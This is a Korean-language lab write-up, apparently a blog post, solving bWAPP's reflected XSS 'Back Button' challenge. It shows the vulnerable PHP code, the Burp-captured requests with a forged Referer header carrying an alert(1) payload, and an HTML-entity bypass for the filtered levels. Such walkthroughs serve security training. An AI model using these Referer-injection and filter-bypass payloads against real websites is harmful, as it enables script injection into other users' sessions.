---
layout: single
title: (bWAPP)XSS - Reflected (Back Button)
categories: bwapp
tag: [xss,reflected,stored,reflected xss, bee box,stored xss, OWASP TOP 10, OWASP, bwapp, dom xss]
toc: true
author_profile: false
---

## Level - Low

![그림 1-1](/assets/image/bwapp/xss/Reflected%20(Back)-archive/image.png)
- go back라는 버튼이 존재.
- 해당 버튼을 누르면 이전 사이트로 Redirect 됨

```php
<input type=button value="Go back" onClick="document.location.href='<?php echo isset($_SERVER["HTTP_REFERER"]) ? xss($_SERVER["HTTP_REFERER"]) : ""?>'">
```

- 위의 해당 시나리오에서 제공되는 소스코드를 보게되면,
- 사용자의 요청헤더 중 Referer 헤더의 내용을 가져와 isset 함수의 인자로 사용된다.

```
GET /bWAPP/portal.php HTTP/1.1
Host: 192.168.146.133
Cookie: security_level=0; PHPSESSID=2fc85d4842bc7f4f7a44f30e9a034c2f
Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.146.133/bWAPP/xss_back_button.php
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
```

- 요청값을 버프스위트를 통해 확인해보면 Go back 버튼을 누르게 되면
- Referer 헤더의 값으로 이전 위치가 지정되어있는 걸 알 수 있다.
- 이를 통해 Referer 헤더를 변조시켜 악성 스크립트가 가능하다.

```php
<input type=button value="Go back" onClick="document.location.href='<?php echo isset($_SERVER["HTTP_REFERER"]) ? xss($_SERVER["HTTP_REFERER"]) : ""?>'">
```

- 위 부분에서 onClick 부분이 document.location.href='<?php >~~' 로 되어있다.
- 이 때 입력값을 ';alert(1);' 을 주어 스크립트를 실행시킬 수 있다.
- ';를 통해 document.location.href를 종료시키고 alert 이벤트를 호출 후 ;종료 후 '를 통해 뒷 부분에서의 오류가 발생하지 않도록 이어준다.
- 즉 \<input type=button value="Go back" onClick="document.location.href='<?php echo isset(';alert(1);') ? xss($_SERVER["HTTP_REFERER"]) : ""?>'"> 가 완성되게 된다.

```
GET /bWAPP/xss_back_button.php HTTP/1.1
Host: 192.168.146.133
Cookie: security_level=0; PHPSESSID=2fc85d4842bc7f4f7a44f30e9a034c2f
Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: ';alert(1);'
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
```

> 이 때 요청값을 잡기 전에 새로고침을 통해 Referer 값을 현재 사이트인 xss_back_button.php 로 잡아놓아야한다.

![그림 1-2 ](/assets/image/bwapp/xss/Reflected%20(Back)-archive/image-1.png)
- 성공적으로 alert창이 띄워진 걸 볼 수 있다.

## Level - Medium & High

```php
return htmlentities($data, ENT_QUOTES);
```

- medium Level의 필터링 부분이다.
- htmlentities 함수를 사용해서 '(싱글 쿼터)를 필터링 하고 있다.
- 이 경우 HTML Entity 문자를 사용하여 우회할 수 있다.
- '(싱글 쿼터) 대신 &apos; 혹은 &#39; 을 사용하여 우회할 수 있다.

```
GET /bWAPP/xss_back_button.php HTTP/1.1
Host: 192.168.146.133
Cookie: security_level=0; PHPSESSID=2fc85d4842bc7f4f7a44f30e9a034c2f
Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: &apos;;alert(1);&apos;
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
```

```php
return htmlspecialchars($data, ENT_QUOTES, $encoding);
```

- High Level 에서의 필터링 부분이다.
- htmlspecialchars 함수를 사용하여 메타 문자에 대해 Html Entity 값으로 변환 하여 필터링 하고 있다.
- 해당 시나리오에서는 서버측에서 HTML Entity 값을 제대로 해석하지 못하고 일반적인 HTML 문자로 변환하여 반환하므로 이전과 동일한 ';alert(1);'을 통한 스크립트 실행이 가능하다.

```
GET /bWAPP/xss_back_button.php HTTP/1.1
Host: 192.168.146.133
Cookie: security_level=0; PHPSESSID=2fc85d4842bc7f4f7a44f30e9a034c2f
Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: ';alert(1);'
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
```